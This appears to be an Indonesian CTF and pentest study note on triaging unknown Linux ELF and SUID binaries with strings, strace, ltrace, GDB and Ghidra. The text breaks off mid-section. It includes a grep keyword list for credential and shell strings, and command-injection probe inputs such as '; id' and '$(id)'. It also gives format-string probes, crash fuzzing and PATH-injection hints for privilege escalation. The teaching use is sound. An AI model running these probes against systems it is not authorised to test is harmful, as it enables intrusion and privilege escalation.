---
id: "48"
title: "🔬 48 — Binary Analysis Workflow"
category: "6. Binary & Reversing"
categoryId: "binary"
filename: "48_binary_analysis_workflow.md"
refs_out: ["44","47","49","50","51"]
refs_in: ["07","47","49","50","52","55"]
---

# 🔬 48 — Binary Analysis Workflow

> **Category:** Binary Analysis / Reverse Engineering Triage  
> **Difficulty:** Beginner → Intermediate  
> **Type:** Static Analysis + Dynamic Analysis + Vulnerability Identification  
> **Prerequisite:** File 47 — Sudo, SUID & Capabilities  
> **Attacker:** Parrot OS XFCE  
> **Target:** Linux ELF Binary  
> **Primary Goal:** Mengetahui **apa binary ini, apa yang dilakukannya, apa yang menarik, dan vulnerability class apa yang mungkin ada**.

---

# 🧭 BAGIAN 0 — FONDASI

## 0.1 🎯 Kapan File Ini Digunakan?

File 48 digunakan ketika menemukan:

```text
File 47
   ↓
SUID binary
   ↓
Custom / unknown binary
   ↓
GTFOBins tidak membantu
   ↓
Masuk File 48
```

Contoh:

```text
-rwsr-xr-x 1 root root 17384 /opt/custom_backup
```

Binary tersebut:

```text
✅ root-owned
✅ SUID
✅ custom location
✅ tidak dikenal
```

Pertanyaan sekarang bukan:

```text
"Exploit apa?"
```

melainkan:

```text
"Program ini sebenarnya melakukan apa?"
```

---

## 0.1.1 🧩 Trigger Lain

Gunakan File 48 jika:

```text
[ ] CTF memberikan ELF binary
[ ] SUID binary custom ditemukan
[ ] Binary berjalan sebagai root
[ ] Binary memakai input user
[ ] Binary meminta password/key
[ ] Binary crash
[ ] Binary memiliki fungsi tersembunyi
[ ] Binary menggunakan command eksternal
[ ] Binary memuat shared library
```

---

# 0.1.2 🚫 Apa yang BUKAN Tujuan File Ini?

File 48 **bukan** full exploit development.

File 48 berakhir pada:

```text
TRIAGE
   ↓
UNDERSTANDING
   ↓
VULNERABILITY CLASS IDENTIFICATION
```

Kemudian pindah:

```text
Buffer Overflow
   → File 49

ROP
   → File 50

Reverse Engineering Deep Dive
   → File 51
```

---

# 0.2 🗺️ Binary Analysis Workflow Overview

```text
                 [BINARY DITEMUKAN]
                         │
                         ▼
                 [QUICK TRIAGE]
                 file / ls / ldd
                 checksec
                         │
                         ▼
               [STATIC ANALYSIS]
        strings / readelf / objdump
                         │
                         ▼
               [DYNAMIC ANALYSIS]
           strace / ltrace / GDB
                         │
                         ▼
                  [GHIDRA]
             Reverse program logic
                         │
                         ▼
            [IDENTIFY VULNERABILITY]
                         │
          ┌──────────────┼───────────────┐
          │              │               │
          ▼              ▼               ▼
       PATH INJ        BOF          FORMAT STRING
          │              │               │
          ▼              ▼               ▼
       File 47        File 49         File 49
                         │
                         ▼
                    [EXPLOIT]
```

---

# 0.3 🧠 Konteks Analisis

|Konteks|Tujuan|Tools utama|Output|
|---|---|---|---|
|CTF Binary|Cari logic/vulnerability/flag|Ghidra, GDB|Exploit/flag|
|Custom SUID|Cari PrivEsc|strings, strace, Ghidra|root|
|Malware|Pahami behavior|strings, strace/ltrace, Ghidra|IOC/behavior|
|RE Challenge|Pahami algoritma|Ghidra, GDB|Flag/key|
|Crackme|Bypass validation|Ghidra, ltrace, patching|Valid input|
|Exploit Triage|Cari vulnerability class|checksec, GDB, Ghidra|BOF/format/etc|

---

# 🔬 BAGIAN 1 — STATIC ANALYSIS TANPA TOOLS BERAT

# 1.1 ⚡ Quick Triage

Gunakan **urutan ini** terlebih dahulu.

```bash
# Step 1 — Identifikasi tipe binary
file /path/to/binary

# Step 2 — Cek owner dan permission
ls -la /path/to/binary

# Step 3 — Cek apakah stripped
file /path/to/binary | grep -iE "stripped|not stripped"

# Step 4 — Cek shared libraries
ldd /path/to/binary

# Step 5 — Cek security mitigations
checksec --file=/path/to/binary
```

---

# 1.1.1 📄 `file`

```bash
# Identifikasi format ELF
file /path/to/binary
```

Contoh:

```text
/opt/custom_backup:
ELF 64-bit LSB pie executable,
x86-64,
version 1 (SYSV),
dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 3.2.0,
with debug_info,
not stripped
```

Analisis:

```text
ELF 64-bit
     ↓
Linux executable

x86-64
     ↓
Architecture

PIE executable
     ↓
PIE enabled

dynamically linked
     ↓
Shared libraries digunakan

not stripped
     ↓
Symbols mungkin masih tersedia
```

---

# 1.1.2 🔐 `ls -la`

```bash
# Lihat ownership dan permission
ls -la /path/to/binary
```

Contoh:

```text
-rwsr-xr-x 1 root root 17384 Sep  8 12:10 /opt/custom_backup
```

Perhatikan:

```text
   s
   │
   └── SUID
```

dan:

```text
root root
```

Kesimpulan:

```text
root-owned SUID binary
        ↓
HIGH PRIORITY
```

---

# 1.1.3 ✂️ Stripped vs Not Stripped

```bash
# Check symbol status
file /path/to/binary
```

Contoh:

```text
not stripped
```

berarti informasi symbol lebih mungkin masih tersedia.

Contoh:

```text
stripped
```

berarti sebagian symbol/debug information telah dihapus.

### Tetapi:

```text
stripped ≠ impossible to reverse
```

Ghidra masih dapat:

```text
disassemble
analyze control flow
identify functions
identify strings
recover approximate variables
```

---

# 1.1.4 🧩 `ldd`

```bash
# Tampilkan dynamic dependencies
ldd /path/to/binary
```

Contoh:

```text
linux-vdso.so.1
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
libcrypto.so.3 => /lib/x86_64-linux-gnu/libcrypto.so.3
libcustom.so => not found
```

Temuan:

```text
libcustom.so => not found
```

menarik karena:

```text
binary
   ↓
membutuhkan library
   ↓
library tidak ditemukan
   ↓
investigate loader/search path
```

---

# 1.1.5 🛡️ `checksec`

```bash
# Check exploit mitigations
checksec --file=/path/to/binary
```

Contoh:

```text
RELRO           STACK CANARY      NX
Partial RELRO   Canary found      NX enabled

PIE             RPATH             RUNPATH
PIE enabled     No RPATH          No RUNPATH

Stripped        Fortify
No              Yes
```

---

# 1.2 🔤 Strings Analysis

Strings adalah salah satu tool paling powerful untuk triage awal.

```bash
# Semua printable strings
strings /path/to/binary
```

---

## Minimum length

```bash
# Hanya string minimal 8 karakter
strings -n 8 /path/to/binary
```

---

## Cari keyword menarik

```bash
# Cari credential, shell, network, flag, command
strings /path/to/binary | \
grep -Ei \
'password|passwd|secret|key|flag|token|http|https|curl|wget|bash|sh|system|exec'
```

---

## Data sections

```bash
# Cari printable strings yang berasal dari data sections
strings -d /path/to/binary
```

---

# 1.2.1 📋 String → Makna → Action

|String ditemukan|Kemungkinan arti|Action|
|---|---|---|
|`/bin/bash`|Shell execution|Cari xref/caller|
|`/bin/sh`|Shell execution|Analisis function|
|`system`|libc command execution|Cari argument|
|`execve`|Process execution|Trace/inspect caller|
|`popen`|Process + pipe|Cari command source|
|`password`|Credential validation|ltrace/Ghidra|
|`passwd`|Password-related logic|Cari comparison|
|`secret`|Hardcoded secret|Validate|
|`flag`|CTF clue|Investigate|
|`/etc/passwd`|User database|File read/write path|
|`/etc/shadow`|Password hashes|Sensitive access|
|`/root/`|Privileged path|SUID relevance|
|`sudo`|Privilege action|Investigate privilege flow|
|`tar`|Archive command|PATH/wildcard possibility|
|`cp`|File copy|Privileged file manipulation|
|`mv`|File move|File overwrite possibility|
|`curl`|Network request|URL/source analysis|
|`wget`|Download|Network/input analysis|
|`http://`|Network endpoint|Trace behavior|
|`https://`|Network endpoint|Endpoint analysis|
|`strcmp`|String comparison|Password/key check|
|`strncmp`|Bounded string comparison|Validation logic|
|`memcmp`|Byte comparison|Key/hash validation|
|`gets`|Unsafe input|Buffer overflow candidate|
|`strcpy`|Unsafe copy|Buffer overflow candidate|
|`sprintf`|Potential overflow|Analyze destination buffer|
|`%s`|String formatting/input|Check bounds|
|`%n`|Format-string primitive|High priority|
|`Usage:`|CLI syntax|Hidden functionality|
|`DEBUG`|Debug behavior|Environment manipulation|
|`LD_PRELOAD`|Library manipulation|Investigate loader|
|`.so`|Shared library|Dependency analysis|

---

# 1.2.2 🔍 Jangan Percaya Strings Secara Blind

Misalnya:

```text
/bin/bash
```

ditemukan.

Tidak berarti:

```text
"binary pasti spawn bash"
```

Bisa saja:

```text
string hanya tersimpan
```

Tetapi jika:

```text
/bin/bash
   ↓
xref
   ↓
function()
   ↓
system("/bin/bash")
```

baru sangat menarik.

---

# 1.3 📚 readelf & objdump

# 1.3.1 Sections

```bash
# Lihat ELF sections
readelf -S /path/to/binary
```

Cari:

```text
.text
.rodata
.data
.bss
.plt
.got
```

---

# 1.3.2 Symbols

```bash
# Tampilkan symbols
readelf -s /path/to/binary
```

atau:

```bash
# Alternate symbol viewer
nm /path/to/binary
```

Jika:

```text
main
check_password
win
authenticate
```

masih terlihat:

```text
GOOD NEWS
```

Reverse engineering akan lebih mudah.

---

# 1.3.3 Dynamic dependencies

```bash
# Tampilkan NEEDED libraries
readelf -d /path/to/binary | grep NEEDED
```

---

# 1.3.4 PLT Functions

```bash
# Cari imported function stubs
objdump -d /path/to/binary | \
grep -E '<.*@plt>'
```

Contoh:

```text
0000000000401030 <puts@plt>:
0000000000401040 <printf@plt>:
0000000000401050 <strcmp@plt>:
0000000000401060 <system@plt>:
0000000000401070 <strcpy@plt>:
```

Ini sangat menarik.

---

# 1.3.5 Dynamic Symbols

```bash
# Tampilkan dynamic symbols
objdump -T /path/to/binary
```

---

# 1.3.6 Disassembly

```bash
# Disassemble entire binary
objdump -d /path/to/binary
```

Lebih kecil:

```bash
# Lihat awal output
objdump -d /path/to/binary | head -100
```

Jika symbol tersedia:

```bash
# Fokus main
objdump -d /path/to/binary | \
grep -A50 '<main>'
```

---

# 1.3.7 🚩 Red Flags

Cari function:

```text
system
execve
popen
strcpy
strcat
sprintf
gets
scanf
printf
memcpy
read
write
open
```

Tidak semuanya vulnerability.

Contohnya:

```text
read()
```

bisa benar-benar aman jika:

```text
size = correct
```

Yang dicari adalah:

```text
DANGEROUS FUNCTION
+
UNTRUSTED INPUT
+
INSUFFICIENT VALIDATION
```

---

# 1.4 🛡️ Checksec Deep Dive

|Mitigation|Enabled|Disabled|Impact|
|---|---|---|---|
|NX|Stack/code injection lebih sulit|Stack dapat executable|Shellcode lebih feasible|
|PIE|Binary base dapat randomized|Main binary fixed|Address prediction lebih mudah|
|Canary|Stack corruption detection|Tidak ada canary|BOF lebih mudah|
|RELRO|GOT lebih terlindungi|GOT dapat lebih writable|GOT overwrite lebih mungkin|
|ASLR|Addresses randomized|Addresses predictable|ROP/address attacks lebih mudah|
|FORTIFY|Beberapa dangerous calls diperkuat|Tidak ada|Beberapa memory bugs lebih exploitable|

---

# 1.4.1 🧱 NX

Analogi:

```text
NX = "Jangan jadikan data sebagai code."
```

Enabled:

```text
Stack
 ↓
data
```

tidak mudah dieksekusi sebagai machine code.

Dalam CTF:

```text
NX ON
 ↓
traditional stack shellcode
lebih sulit
 ↓
ret2libc / ROP
```

---

# 1.4.2 🎯 PIE

Analogi:

```text
PIE = alamat binary tidak selalu sama
```

Enabled:

```text
ASLR
+
PIE
=
main binary dapat berpindah
```

Disabled:

```text
main binary
=
fixed-ish addresses
```

---

# 1.4.3 🛑 Canary

Analogi:

```text
Canary = alarm kecil di stack.
```

Jika stack overwrite melewati canary:

```text
CANARY MISMATCH
    ↓
program terminate
```

---

# 1.4.4 🔒 RELRO

RELRO melindungi relocation/GOT structures.

Secara umum:

```text
No RELRO
   ↓
GOT lebih mudah dimodifikasi

Partial RELRO
   ↓
sebagian proteksi

Full RELRO
   ↓
GOT relocation dibuat read-only setelah relocation
```

---

# 1.4.5 🌪️ ASLR

ASLR mengacak lokasi address space.

Cek kernel:

```bash
# Lihat ASLR setting
cat /proc/sys/kernel/randomize_va_space
```

Interpretasi umum:

```text
0 = disabled
1 = partial
2 = full
```

---

# 🔬 BAGIAN 2 — DYNAMIC ANALYSIS

# 2.1 🕵️ strace

`strace` melihat system calls.

Gunakan ketika pertanyaan Anda adalah:

```text
"Kernel-level operation apa yang sebenarnya dilakukan binary?"
```

---

# 2.1.1 Basic

```bash
# Trace semua system call
strace /path/to/binary 2>&1
```

---

# 2.1.2 Filter

```bash
# Fokus file, input/output, dan process creation
strace \
  -e trace=openat,read,write,execve \
  /path/to/binary 2>&1
```

---

# 2.1.3 Simpan ke file

```bash
# Save trace
strace \
  -o /tmp/strace.out \
  /path/to/binary
```

---

# 2.1.4 Follow child processes

```bash
# -f = follow forks/clones
strace -f /path/to/binary 2>&1
```

---

# 2.1.5 Timestamp

```bash
# -t = timestamp
strace -t /path/to/binary 2>&1
```

---

# 2.1.6 📋 strace Output → Meaning

|Output|Meaning|Action|
|---|---|---|
|`execve("backup",...)`|Program search by name|PATH injection candidate|
|`execve("/bin/bash",...)`|Absolute command execution|Inspect caller|
|`openat("/etc/passwd"...`|File access|Analyze read/write mode|
|`openat(... O_WRONLY...)`|File write|Check privilege impact|
|`connect(...)`|Network connection|Identify destination|
|`access(...)`|Existence/permission check|Possible logic flaw|
|`stat(...)`|Metadata check|Could influence branch|
|`read(0,...`|Reads stdin|User-controlled input|
|`recvfrom(...)`|Network input|Untrusted network data|
|`write(1,...`|Output to stdout|Useful for tracing result|
|`fork()`|Creates process|Follow with `-f`|
|`clone()`|Creates process/thread|Follow with `-f`|
|`unlink(...)`|Deletes file|Dangerous file action|
|`rename(...)`|Renames file|File manipulation|
|`chmod(...)`|Changes permissions|SUID/file privilege candidate|
|`setuid(...)`|Changes UID|Extremely interesting|
|`setgid(...)`|Changes GID|Privilege-related|
|`ptrace(...)`|Debug/process manipulation|Advanced|
|`mmap(...)`|Memory mapping|Memory exploitation analysis|

---

# 2.1.7 🚨 PATH Injection Example

Suppose:

```text
execve("backup", ["backup"], ...)
```

rather than:

```text
execve("/usr/bin/backup", ...)
```

This means process execution uses:

```text
backup
```

without explicit absolute path.

Investigate:

```bash
# Check PATH
echo "$PATH"

# Locate currently resolved command
command -v backup
```

Jika custom SUID binary memanggil command tersebut dalam privileged context:

```text
PATH control
+
privileged process
=
PATH injection candidate
```

Kembali ke:

```text
./[🐧 47 — Sudo, SUID & Capabilities Workflow](/docs/sudo-suid-capabilities)
```

---

# 2.2 🔍 ltrace

`ltrace` berbeda dari `strace`.

```text
strace
=
syscalls

ltrace
=
library calls
```

---

# 2.2.1 Basic

```bash
# Trace library calls
ltrace /path/to/binary 2>&1
```

---

# 2.2.2 Function filter

```bash
# Trace strcmp
ltrace -e strcmp /path/to/binary 2>&1
```

Wildcard:

```bash
# Trace functions matching pattern
ltrace -e 'str*' /path/to/binary 2>&1
```

---

# 2.2.3 Dengan argument

```bash
# Run with user input
ltrace /path/to/binary argument1 2>&1
```

---

# 2.2.4 🔐 Password Check Example

Misalnya:

```bash
# Run binary under ltrace
ltrace ./login
```

Output:

```text
printf("Password: ")                          = 10
__isoc99_scanf("%32s", 0x7fffffffe2c0)       = 1
strcmp("admin123", "admin123")              = 0
puts("Access granted")                       = 15
```

Analisis:

```text
strcmp("admin123", "admin123")
              │
              ├── value 1 = input
              └── value 2 = expected value
```

Dengan:

```text
strcmp() = 0
```

berarti dua string sama.

### ⚠️ Penting

ltrace tidak selalu berhasil.

Misalnya:

```text
Static binary
stripped/custom implementation
anti-tracing
syscall direct
optimized code
```

---

# 2.2.5 🧪 Key Check

Contoh:

```text
memcmp(input, expected, 16) = 0
```

Ini berarti:

```text
input
 ↓
compared byte-by-byte
 ↓
16 bytes
```

Pergi ke Ghidra untuk mencari:

```text
expected
```

---

# 2.3 🧪 Menjalankan Binary dengan Input Berbeda

## Tanpa argument

```bash
# Jalankan normal
/path/to/binary
```

---

## Dengan argument

```bash
# Kirim argument
/path/to/binary arg1 arg2
```

---

## Stdin

```bash
# Pipe stdin
echo "test" | /path/to/binary
```

---

## Input panjang

```bash
# Basic crash/fuzz test
python3 -c 'print("A"*200)' | /path/to/binary
```

---

## Environment

```bash
# Set environment variable
DEBUG=1 /path/to/binary
```

---

# 2.3.1 🧠 Input Matrix

Saat menganalisis binary, gunakan:

```text
NO INPUT
   ↓
SHORT INPUT
   ↓
LONG INPUT
   ↓
SPECIAL CHARACTERS
   ↓
NUMERIC INPUT
   ↓
MULTIPLE ARGUMENTS
   ↓
ENVIRONMENT VARIABLE
```

Contoh:

```bash
# Normal
./binary test

# Long
./binary "$(python3 -c 'print("A"*200)')"

# Special characters
./binary 'AAAA!@#$%^&*()'

# Numeric
./binary 0
./binary -1
./binary 999999999
```

---

# 🔧 BAGIAN 3 — GDB BASICS

# 3.1 🐞 Setup GDB + pwndbg

Install GDB:

```bash
# Install GDB
sudo apt update
sudo apt install gdb
```

Clone pwndbg:

```bash
# Clone repository
git clone https://github.com/pwndbg/pwndbg
```

Masuk:

```bash
# Enter directory
cd pwndbg
```

Install:

```bash
# Install pwndbg according to repository instructions
./setup.sh
```

Start:

```bash
# Open binary
gdb /path/to/binary
```

---

# 3.1.1 🧰 GEF Alternative

```bash
# Download GEF bootstrap script
wget -O ~/.gdbinit-gef.py https://gef.blah.cat/py
```

Tambahkan:

```bash
# Load GEF
echo 'source ~/.gdbinit-gef.py' >> ~/.gdbinit
```

> Gunakan salah satu framework terlebih dahulu. Jangan menggabungkan konfigurasi GDB secara acak.

---

# 3.2 🎮 GDB Quick Reference

```bash
# Open binary
gdb ./binary
```

Dalam GDB:

```text
run
run arg1 arg2

break main
break function_name
break *0x401234
b *main+50

continue
next
step
finish

info registers
info functions
info symbols
info frame

x/20wx $rsp
x/20gx $rsp
x/s 0x401234

print $rax
print/x $rax

disassemble main
disassemble function_name

backtrace
bt

info proc mappings
```

---

# 3.2.1 📚 GDB Command Table

|Command|Fungsi|Kapan dipakai|
|---|---|---|
|`run`|Start program|Awal debugging|
|`run arg1`|Run dengan argument|Input analysis|
|`continue`|Lanjut sampai breakpoint|Step flow|
|`next`|Next line, skip function|High-level logic|
|`step`|Masuk function|Function analysis|
|`finish`|Run sampai current function return|Keluar function|
|`break main`|Breakpoint di main|Start analysis|
|`break func`|Break function|Analyze specific path|
|`break *ADDR`|Break address|Assembly analysis|
|`info breakpoints`|Daftar breakpoint|Manage breakpoints|
|`delete`|Delete breakpoint|Cleanup|
|`info registers`|Semua register|Crash/debug|
|`print $rax`|Tampilkan register|Data analysis|
|`print/x $rax`|Hex output|Pointer/address|
|`x/s ADDR`|Examine string|String analysis|
|`x/gx ADDR`|Examine giant word|Pointer/memory|
|`x/20gx $rsp`|Stack memory|Stack analysis|
|`x/20wx $rsp`|32-bit words|Stack analysis|
|`disassemble main`|Disassemble main|Reverse logic|
|`backtrace`|Call stack|Crash analysis|
|`info frame`|Current frame|Stack|
|`info functions`|Function list|RE|
|`info symbols`|Symbol list|RE|
|`info proc mappings`|Memory map|ASLR/PIE|
|`set disassembly-flavor intel`|Intel syntax|x86 analysis|
|`quit`|Keluar GDB|End session|

---

# 3.2.2 🧠 Intel Syntax

```text
Intel:
mov rax, rbx

AT&T:
mov %rbx, %rax
```

Untuk CTF pemula:

```gdb
# Gunakan Intel syntax
set disassembly-flavor intel
```

---

# 3.2.3 🔍 Register x86-64 yang Perlu Dihafal

```text
RAX → return value / accumulator
RBX → general purpose
RCX → general purpose / 4th arg pada Windows ABI
RDX → 3rd argument pada SysV ABI
RSI → 2nd argument
RDI → 1st argument
RSP → stack pointer
RBP → base/frame pointer
RIP → instruction pointer
```

Linux x86-64 SysV function arguments:

```text
1st = RDI
2nd = RSI
3rd = RDX
4th = RCX
5th = R8
6th = R9
```

Ini penting saat membaca disassembly.

---

# 3.3 💥 Analisis Crash

Misalkan:

```bash
# Input panjang
python3 -c 'print("A"*200)' | ./binary
```

Binary:

```text
Segmentation fault
```

Sekarang:

```bash
# Open GDB
gdb ./binary
```

Run:

```gdb
run < <(python3 -c 'print("A"*200)')

> [!NOTE]
> **Process substitution** (`<(…)`) is a Bash feature that runs the command inside the parentheses and provides its output as a temporary file descriptor. GDB reads this temporary file as standard input.
>
> **Beginner‑friendly alternatives:**
> 1. **Pipe** – `python3 -c 'print("A"*200)' | ./binary`
> 2. **Heredoc** – `./binary <<< "$(python3 -c 'print("A"*200)')"`
> 3. **Temporary file** –
>    ```bash
>    python3 -c 'print("A"*200)' > /tmp/input.txt
>    ./binary < /tmp/input.txt
>    ```
> 4. **GDB with file** –
>    ```bash
>    python3 -c 'print("A"*200)' > /tmp/input.txt
>    gdb ./binary
>    (gdb) run < /tmp/input.txt
>    ```
```

---

## Register

```gdb
info registers
```

Cari:

```text
rip
rsp
rbp
```

Jika:

```text
rip = 0x4141414141414141
```

maka:

```text
A = 0x41
```

dan:

```text
RIP dikontrol input
```

adalah red flag kuat untuk memory corruption.

---

# 3.3.1 🔢 Cyclic Pattern

Dengan pwndbg:

```gdb
cyclic 200
```

Atau shell:

```bash
# Generate cyclic pattern
cyclic 200
```

Masukkan:

```gdb
run < <(python3 -c 'from pwn import cyclic; print(cyclic(200).decode())')
```

Setelah crash:

```gdb
# Misalnya RIP berisi nilai pattern
info registers rip
```

Kemudian:

```bash
# Cari offset
cyclic -l 0x61616166
```

Jika menggunakan pwntools Python:

```python
from pwn import *

pattern = cyclic(200)
print(pattern)

offset = cyclic_find(0x61616166)
print(offset)
```

---

# 🧠 BAGIAN 4 — GHIDRA BASICS

# 4.1 🏛️ Setup Ghidra

Di Parrot, cek apakah tersedia:

```bash
# Search package
apt-cache search ghidra
```

Jika repository distro menyediakan:

```bash
# Install package jika tersedia
sudo apt install ghidra
```

Alternative:

```bash
# Download official release sesuai versi yang dibutuhkan
# dari repository resmi Ghidra
```

Run:

```bash
# Launch Ghidra
ghidra
```

---

# 4.2 🧭 Ghidra CTF Workflow

```text
STEP 1
New Project
      ↓
Non-Shared Project
      ↓
STEP 2
Import Binary
      ↓
STEP 3
Auto Analyze
      ↓
STEP 4
Open CodeBrowser
      ↓
STEP 5
Find main()
      ↓
STEP 6
Read Listing
      ↓
STEP 7
Read Decompiler
      ↓
STEP 8
Trace interesting functions
```

---

# 4.2.1 📁 New Project

Pilih:

```text
File
 ↓
New Project
 ↓
Non-Shared Project
```

Pilih directory.

---

# 4.2.2 📥 Import Binary

```text
File
 ↓
Import
 ↓
Select binary
```

Contoh:

```text
custom_backup
```

Ghidra akan mendeteksi:

```text
ELF
x86-64
```

---

# 4.2.3 🤖 Auto Analyze

Setelah import:

```text
Yes → Analyze
```

Pilih default analyzers untuk pertama kali.

Tujuannya:

```text
functions
strings
references
control flow
data
```

---

# 4.2.4 🧩 Window Layout

Biasakan:

```text
┌─────────────┬─────────────────────┐
│ Symbol Tree │      Listing        │
│             │                     │
│ Functions   │ Assembly            │
│ Strings     │ Instructions        │
│ Imports     │                     │
├─────────────┴─────────────────────┤
│          Decompiler               │
│       C-like pseudocode            │
└────────────────────────────────────┘
```

---

# 4.2.5 🎯 Navigasi ke `main`

Di Symbol Tree:

```text
Functions
   ↓
main
```

Double-click:

```text
main
```

Decompiler menampilkan kode C-like.

---

# 4.2.6 🧠 Contoh Decompiled Code

Misalnya:

```c
int main(void)
{
    char password[64];

    printf("Password: ");
    scanf("%63s", password);

    if (strcmp(password, "SuperSecret123") == 0) {
        puts("Access granted");
        return 0;
    }

    puts("Access denied");
    return 1;
}
```

Sekarang Anda sudah tahu:

```text
Input
 ↓
password
 ↓
strcmp()
 ↓
hardcoded string
 ↓
Access granted
```

---

# 4.3 🔍 Apa yang Dicari di Ghidra?

## `main()`

Pertanyaan:

```text
Program mulai dari mana?
Input masuk ke mana?
Function apa dipanggil?
Condition apa?
```

---

## String comparison

Cari:

```text
strcmp
strncmp
memcmp
```

---

## Hardcoded password

Contoh:

```text
"SuperSecret123"
```

---

## Shell execution

Cari:

```text
system
execve
popen
```

---

## Dangerous input

Cari:

```text
gets
strcpy
strcat
sprintf
scanf
```

---

## Format string

Cari:

```c
printf(user_input);
```

dibanding:

```c
printf("%s", user_input);
```

Perbedaannya sangat penting.

---

# 4.3.1 💥 Buffer Overflow Pattern

Aman:

```c
char buf[32];
read(0, buf, sizeof(buf));
```

Perlu investigasi:

```c
char buf[32];
read(0, buf, 500);
```

Sangat mencurigakan:

```c
char buf[32];
gets(buf);
```

---

# 4.3.2 ⚠️ Format String Pattern

Potentially vulnerable:

```c
printf(input);
```

Relatively safer:

```c
printf("%s", input);
```

---

# 4.4 ✏️ Rename Function / Variable

Jangan membiarkan:

```text
FUN_00401230
local_28
param_1
```

Jika Anda mengetahui fungsi:

```text
FUN_00401230
=
check_password
```

rename menjadi:

```text
check_password
```

Di Ghidra:

```text
Right Click
 ↓
Rename Function
```

---

# 4.4.1 📝 Comments

Tambahkan comment:

```text
"Compares user input with hardcoded password"
```

Gunanya:

```text
decompiled code
    ↓
your own notes
    ↓
faster navigation
```

---

# 4.4.2 🔗 Data Flow

Misalnya:

```text
main()
 ↓
read_input()
 ↓
check_password()
 ↓
strcmp()
 ↓
grant_access()
```

Trace function satu per satu.

Jangan membaca seluruh binary sekaligus.

Gunakan:

```text
Interesting string
        ↓
XREF
        ↓
function
        ↓
caller
        ↓
data flow
```

---

# 🧨 BAGIAN 5 — VULNERABILITY IDENTIFICATION

# 5.1 💥 Buffer Overflow Detection

## Quick static test

```bash
# Cari dangerous input/copy functions
strings /path/to/binary | \
grep -E 'gets|strcpy|strcat|sprintf|scanf'
```

Namun:

> `strings` tidak selalu menampilkan imported function dengan cara yang berguna.

Lebih baik:

```bash
# Cari imported symbols
objdump -T /path/to/binary | \
grep -E 'gets|strcpy|strcat|sprintf|scanf'
```

---

## checksec

```bash
# Check exploit mitigations
checksec --file=/path/to/binary

Example output on a typical Parrot binary:
```text
[*] '/opt/custom_backup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- **RELRO** – *Partial* means the GOT is partially protected; full RELRO would also mark the GOT read‑only.
- **Stack Canary** – indicates stack‑buffer‑overflow protection is present.
- **NX** – non‑executable stack; disables execution of injected shellcode on the stack.
- **PIE** – position‑independent executable, which randomizes the load address (ASLR).

Use this information to decide which exploitation techniques are viable.

```

---

## Basic fuzz

```bash
# 100 bytes
python3 -c 'print("A"*100)' | /path/to/binary

# 500 bytes
python3 -c 'print("A"*500)' | /path/to/binary

# 1000 bytes
python3 -c 'print("A"*1000)' | /path/to/binary
```

Jika crash:

```text
CRASH
 ↓
GDB
 ↓
RIP/RSP
 ↓
controlled?
 ↓
offset
 ↓
File 49
```

---

# 5.1.1 🧠 Jangan Samakan Crash dengan BOF

```text
Segmentation fault
```

bisa disebabkan:

```text
NULL pointer
invalid pointer
bad index
use-after-free
buffer overflow
format string
```

Karena itu:

```text
CRASH
≠
BUFFER OVERFLOW
```

---

# 5.2 🧪 Format String Detection

Input:

```bash
# Format string probes
echo "%x %x %x %x" | /path/to/binary
```

```bash
# String pointer probe
echo "%s %s %s" | /path/to/binary
```

```bash
# Write primitive probe
echo "%n" | /path/to/binary
```

### ⚠️ Jangan menyimpulkan:

```text
output berubah
=
vulnerability pasti
```

Cari source/decompiler:

```c
printf(user_input);
```

atau trace:

```text
printf(...)
```

dan pahami apakah user input benar-benar menjadi format string.

---

# 5.3 💻 Command Injection Detection

Cari:

```bash
# Cari shell-related functions
objdump -T /path/to/binary | \
grep -E 'system|execve|popen'
```

Dynamic:

```bash
# Trace system() calls
ltrace /path/to/binary 2>&1 | \
grep system
```

Testing di lab:

```bash
# Semicolon
/path/to/binary "; id"

# Command substitution
/path/to/binary '$(id)'

# Pipe
/path/to/binary '| id'

# Backticks
/path/to/binary '`id`'
```

Jika berhasil:

```text
Input
 ↓
shell parser
 ↓
attacker command
 ↓
execution
```

maka command injection candidate.

---

# 5.3.1 🧠 `system()` Tidak Otomatis Vulnerable

Misalnya:

```c
system("/bin/echo hello");
```

tidak sama dengan:

```c
system(user_input);
```

Perbandingan:

```text
constant command
=
low concern

user-controlled command
=
HIGH concern
```

---

# 5.4 🛣️ PATH Injection

Sudah dibahas di File 47.

Lihat:

```text
./[🐧 47 — Sudo, SUID & Capabilities Workflow](/docs/sudo-suid-capabilities)
```

Trigger dari File 48:

```text
strace
  ↓
execve("backup", ...)
  ↓
PATH dependency
  ↓
custom SUID
  ↓
File 47
```

---

# 🧩 BAGIAN 6 — CTF BINARY PATTERNS

# 6.1 🔐 Password Checker Pattern

Contoh:

```text
./login
Password:
```

Workflow:

```text
Binary
 ↓
ltrace
 ↓
strcmp()
 ↓
hardcoded string
 ↓
valid password
```

---

## Walkthrough

Run:

```bash
# Start ltrace
ltrace ./login
```

Input:

```text
Password: hello
```

Output:

```text
strcmp("hello", "P@ssw0rd123") = -1
puts("Access denied") = 14
```

Analisis:

```text
input
=
hello

expected
=
P@ssw0rd123
```

Test:

```bash
# Run with discovered value
./login
```

Input:

```text
P@ssw0rd123
```

Output:

```text
Access granted
```

---

# 6.1.1 🔬 Jika ltrace Tidak Membantu

Masuk Ghidra:

```text
main
 ↓
strcmp
 ↓
XREF
 ↓
constant string
```

---

# 6.2 🧨 ret2win Pattern

Pattern klasik:

```text
buffer
   ↓
overflow
   ↓
control RIP
   ↓
win()
   ↓
FLAG
```

Cari function:

```bash
# Cari function symbols
nm ./binary | grep -E 'win|flag|secret'
```

atau:

```bash
# GDB
gdb ./binary
```

```gdb
info functions
```

---

## Ghidra

Cari:

```text
win
flag
success
print_flag
get_shell
```

---

## checksec

```bash
# Check mitigations
checksec --file=./binary
```

Contoh:

```text
NX:      enabled
Canary:  disabled
PIE:     disabled
```

Interpretasi:

```text
Canary disabled
+
PIE disabled
+
overflow
=
ret2win candidate
```

### ⚠️ NX tidak berarti BOF tidak mungkin.

NX ON biasanya berarti:

```text
shellcode on stack
```

kurang langsung.

ret2win:

```text
return ke code yang SUDAH ADA
```

masih mungkin.

---

# 6.2.1 🧪 Basic Detection

```bash
# Fuzz input
python3 -c 'print("A"*200)' | ./binary
```

Crash:

```text
Segmentation fault
```

GDB:

```bash
gdb ./binary
```

```gdb
run < <(python3 -c 'print("A"*200)')
info registers
```

Jika RIP controlled:

```text
